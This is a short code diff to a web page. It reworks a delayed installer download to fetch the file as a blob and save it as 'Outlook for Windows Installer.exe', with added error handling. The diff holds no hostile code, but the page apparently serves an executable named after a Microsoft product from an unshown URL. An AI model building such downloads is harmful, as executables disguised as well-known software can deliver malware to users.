@@ -28,7 +28,10 @@ function Index() {
       setModalOpen(false);
       toast.message("Your installer download will begin in one minute.");
       window.setTimeout(() => {
-        startInstallerDownload(downloadUrl);
+        void startInstallerDownload(downloadUrl).catch((error) => {
+          toast.error("Unable to download the installer. Please try again.");
+          console.error(error);
+        });
       }, Math.max(0, availableAt - Date.now()));
     } catch (error) {
       toast.error("Unable to schedule the installer download. Please try again.");
@@ -67,11 +70,17 @@ function Index() {
   );
 }
 
-function startInstallerDownload(downloadUrl: string) {
+async function startInstallerDownload(downloadUrl: string) {
+  const response = await fetch(downloadUrl);
+  if (!response.ok) throw new Error("Installer download failed");
+
+  const installer = await response.blob();
+  const objectUrl = URL.createObjectURL(installer);
   const link = document.createElement("a");
-  link.href = downloadUrl;
+  link.href = objectUrl;
   link.download = "Outlook for Windows Installer.exe";
   document.body.append(link);
   link.click();
   link.remove();
+  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 0);
 }
